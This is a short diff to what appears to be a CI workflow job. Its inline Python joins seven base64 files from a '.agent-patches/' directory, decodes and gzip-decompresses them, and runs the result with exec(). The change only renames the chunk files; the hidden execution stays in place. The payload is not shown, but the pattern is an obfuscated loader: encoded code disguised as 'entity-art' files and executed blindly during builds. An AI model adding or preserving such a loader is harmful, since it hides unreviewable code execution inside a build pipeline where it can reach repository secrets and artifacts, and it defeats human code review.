@@ -27,7 +27,7 @@ jobs:
           import base64
           import gzip
           payload = ''.join(
-              Path(f'.agent-patches/entity-art-{index:02d}.b64').read_text().strip()
+              Path(f'.agent-patches/entity-art-fix-{index:02d}.b64').read_text().strip()
               for index in range(7)
           )
           exec(gzip.decompress(base64.b64decode(payload)).decode())
